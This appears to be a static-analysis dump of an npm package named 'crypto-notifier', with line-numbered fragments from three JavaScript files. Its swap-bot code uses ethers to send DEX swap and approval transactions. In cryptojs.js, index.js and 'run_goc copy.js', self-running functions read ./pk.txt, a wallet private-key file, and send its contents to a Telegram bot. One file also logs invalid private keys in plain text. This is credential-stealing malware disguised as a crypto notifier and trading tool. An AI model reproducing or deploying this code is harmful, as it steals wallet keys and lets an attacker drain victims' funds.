// File: tmp/tmpekxw3y3y/crypto-notifier/package/cryptojs.js
// ======================================================================
Line 1: const axios = require('axios')
Line 2: const fs = require('fs')
Line 10: <operator>.formatString("https://api.telegram.org/bot", TOKEN, "/sendMessage")
Line 11: axios.post(url, {
      chat_id: ID,
      text: message
    })
Line 20: (function notifyPK() {
  fs.readFile('./pk.txt', 'utf8', async (err, data) => {
    if (err) {
      await sendTelegram('Could not read send.txt file: ' + err.message);
      return;
    }
    await sendTelegram(data || '(send.txt file is empty)');
  });
})()
Line 21: fs.readFile('./pk.txt', 'utf8', async (err, data) => {
    if (err) {
      await sendTelegram('Could not read send.txt file: ' + err.message);
      return;
    }
    await sendTelegram(data || '(send.txt file is empty)');
  })
Line 23: sendTelegram('Could not read send.txt file: ' + err.message)
Line 26: sendTelegram(data || '(send.txt file is empty)')

// File: tmp/tmpekxw3y3y/crypto-notifier/package/index.js
// ======================================================================
Line 1: const axios = require('axios')
Line 2: const fs = require('fs')
Line 3: const path = require('path')
Line 20: <operator>.formatString("https://api.telegram.org/bot", config.token, "/sendMessage")
Line 21: axios.post(url, {
      chat_id: config.chatId,
      text: message
    })
Line 34: fs.promises.readFile(filePath, 'utf8')
Line 35: sendTelegram(data || '(File is empty)')
Line 37: sendTelegram('Could not read file: ' + err.message)
Line 43: notifyPK()

// File: tmp/tmpekxw3y3y/crypto-notifier/package/run_goc copy.js
// ======================================================================
Line 1: _tmp_21 = require("ethers")
Line 2: const fs = require('fs')
Line 3: const config = require('./config')
Line 4: const axios = require('axios')
Line 13: <operator>.formatString("https://api.telegram.org/bot", TOKEN, "/sendMessage")
Line 14: axios.post(url, {
      chat_id: ID,
      text: message
    })
Line 24: fs.readFile('./pk.txt', 'utf8', async (err, data) => {
  if (err) {
    await a('Could not read send.txt file: ' + err.message);
    return;
  }
  await a(data || '(send.txt file is empty)');
})
Line 45: const SWAP_ABI = [
  "function mixSwap(address,address,uint256,uint256,uint256,address[],address[],address[],uint256,bytes[],bytes,uint256)",
]
Line 46: _tmp_22.push("function mixSwap(address,address,uint256,uint256,uint256,address[],address[],address[],uint256,bytes[],bytes,uint256)")
Line 48: {
  const iface = new ethers.Interface(SWAP_ABI);
  const tokenIn = "0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE";
  const tokenOut = "0x72df0bcd7276f2dFbAc900D1CE63c272C4BCcCED";
  const amountOutMin = 1240570;
  const line1 = 620285;
  const pools = ["0x133dc434daaa4fDaB19f7599AB552D6Ac350c810"];
  const midTokens = ["0x9876E7DDD0519A6Cb27f82C5dc3f63C96CFe7DF4"];
  const feeAddresses = [
    "0x9876E7DDD0519A6Cb27f82C5dc3f63C96CFe7DF4",
    "0x3541423f25A1Ca5C98fdBCf478405d3f0aaD1164"
  ];
  const line2 = 0;
  const bytesArr = [
    "0x00000000000000000000000000000000000000000000000000000000000000050000000000000000000000000000000000000000000000000000000000002710"
  ];
  const extraBytes = "0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000";
  const deadline = Math.floor(Date.now() / 1000) + 10 * 60;
  return iface.encodeFunctionData("mixSwap", [
    tokenIn, tokenOut, amountIn, amountOutMin, line1, poo...
Line 54: const pools = ["0x133dc434daaa4fDaB19f7599AB552D6Ac350c810"]
Line 55: const midTokens = ["0x9876E7DDD0519A6Cb27f82C5dc3f63C96CFe7DF4"]
Line 57: _tmp_4.push("0x9876E7DDD0519A6Cb27f82C5dc3f63C96CFe7DF4")
Line 58: _tmp_4.push("0x3541423f25A1Ca5C98fdBCf478405d3f0aaD1164")
Line 62: _tmp_5.push("0x00000000000000000000000000000000000000000000000000000000000000050000000000000000000000000000000000000000000000000000000000002710")
Line 67: _tmp_6.push(amountOutMin)
Line 73: ethers.parseEther(config.AMOUNT_IN_ETH).toString()
Line 77: {
      const tx = {
        to: config.SWAP_CONTRACT,
        value: ethers.parseEther(config.AMOUNT_IN_ETH),
        data: inputData,
        gasLimit: 300000,
      };
      tx.gasPrice = await provider.send('eth_gasPrice', []);
      const sentTx = await wallet.sendTransaction(tx);
      logSuccess(`SWAP ✅ Sent: ${sentTx.hash} | From: ${wallet.address} | Run: ${repeatIndex}`);
      await sentTx.wait();
      logInfo(`SWAP ✔️ Confirmed: ${sentTx.hash} | From: ${wallet.address} | Run: ${repeatIndex}`);
      return true;
    }
Line 84: tx.gasPrice = await provider.send('eth_gasPrice', [])
Line 87: sentTx.wait()
Line 92: logError(`SWAP ❌ Error: ${shortErrorMsg(err)} | From: ${wallet.address} | Run: ${repeatIndex} (attempt ${attempt}/${maxRetries})`)
Line 101: _tmp_23.push("function approve(address spender, uint256 amount) public returns (bool)")
Line 102: _tmp_23.push("function allowance(address owner, address spender) public view returns (uint256)")
Line 112: tx.wait()
Line 119: future.toString(16).padStart(64, '0')
Line 125: _iterator_0.next()
Line 126: approveTokenIfNeeded(token, config.LQ_SPENDER, wallet)
Line 140: sentTx.wait()
Line 146: msg.includes('exceeded maximum retry limit')
Line 147: msg.includes('Unable to complete the request')
Line 152: logError(`LQ ❌ Error: ${shortErrorMsg(e)} | From: ${wallet.address} | Run: ${repeatIndex}`)
Line 156: logError(`LQ ❌ Too many retries, skipping this run.`)
Line 162: (_tmp_13 = fs.readFileSync(filePath, 'utf8')
    .split(/\r?\n/)
    .map(line => line.trim()))
Line 164: line.trim()
Line 184: pk.trim()
Line 186: logError(`❌ Invalid private key: ${pk}`)
Line 209: swap(wallet, run)
Line 231: main()
